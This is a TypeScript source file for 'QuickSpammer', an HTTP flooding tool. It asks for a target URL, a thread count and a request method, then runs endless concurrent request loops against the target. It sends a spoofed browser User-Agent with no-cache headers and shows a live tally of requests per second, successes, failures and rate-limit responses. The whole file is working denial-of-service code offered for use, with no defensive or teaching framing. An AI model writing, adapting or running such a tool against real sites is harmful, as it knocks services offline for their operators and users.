import consola from 'consola';
import color from 'picocolors';
import { inputURL } from './prompts/url';
import { DefThreads } from './prompts/defthreads';
import { reqMethod } from './prompts/method';
import { stdout } from 'process';
const version = '1.0.0';

let sent: number = 0;
let ok: number = 0;
let fail: number = 0;
let ratelimited: number = 0;

consola.info(`${color.bgCyan(color.black(`QuickSpammer v${version}`))}`);

async function calcLen() {
	const Termlen = stdout.columns - 2;
	if (Termlen > 50) {
		return 50;
	} else {
		return Termlen;
	}
}

async function display(url: string, reqmethod: string, threads: number) {
	consola.info('Called display manager');
	const len = await calcLen();
	const target = color.white('Target: ') + color.green(url);
	const method = color.white('Method: ') + color.green(reqmethod);
	setInterval(async () => {
		const l1 = color.gray('='.repeat(len));
		const l2 = target;
		const l3 = method;
		const l4 = color.white('Running ') + color.green(threads) + color.white(` threads (${sent}rps)`);
		const l5 = color.white(`${ok} requests are successful | failed ${fail} requests | ratelimited ${ratelimited} requests`);
		const l6 = color.gray('='.repeat(len));
		const message = `${l1}\n${l2}\n${l3}\n${l4}\n${l5}\n${l6}`;
		consola.success(message);
		stdout.write('\x1bc' + message);
		sent = 0;
	}, 1000);
}

async function req(url: string, reqMethod: string) {
	try {
		const res = await fetch(url, {
			headers: {
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
				Accept: '*/*',
				'Cache-Control': 'no-cache',
			},
			referrer: url,
			method: reqMethod,
		});
		sent++;
		if (res.ok) ok++;
		else if (res.status === 429) ratelimited++;
		else {
			consola.log(color.red(`Req failed with code ${res.status}`));
			fail++;
		}
	} catch (e) {
		fail++;
		consola.log(e);
	}
}

async function spawnThread(url: string, method: string, id: number) {
	const prefix = color.gray('[') + color.white(`Thread-${id}`) + color.gray(']');
	consola.success(`${prefix} ${color.green('Spawned')}`);
	while (true) {
		await req(url, method);
	}
}
async function main() {
	const url = await inputURL();
	const threads = await DefThreads();
	const method = await reqMethod();
	consola.log(url);
	consola.log(threads);
	consola.log(method);
	consola.info('Ready!');
	display(url, method, threads);
	for (let i = 0; i < threads; i++) {
		spawnThread(url, method, i);
	}
	consola.success('All threads are successfully called.');
}

main();
